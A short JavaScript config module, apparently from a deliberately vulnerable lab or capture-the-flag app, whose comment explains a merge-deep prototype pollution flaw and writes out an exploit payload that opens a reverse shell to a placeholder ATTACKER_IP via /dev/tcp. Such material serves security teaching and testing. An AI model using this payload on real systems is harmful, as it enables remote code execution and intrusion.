/**
 * Shared mutable config object.
 *
 * VULNERABILITY CONTEXT:
 *   This object is passed into merge-deep() in /routes/report.js.
 *   merge-deep@3.0.2 is vulnerable to prototype pollution via the "__proto__" key.
 *
 *   Exploit payload (POST /api/v1/report/generate, requires is_admin session):
 *   {
 *     "options": {
 *       "__proto__": {
 *         "shell":     "bash",
 *         "shellArgs": ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]
 *       }
 *     }
 *   }
 *
 *   After pollution, the setInterval cleanup in server.js reads config.shell and
 *   config.shellArgs off the prototype chain – giving remote code execution.
 */
const config = {};

module.exports = config;
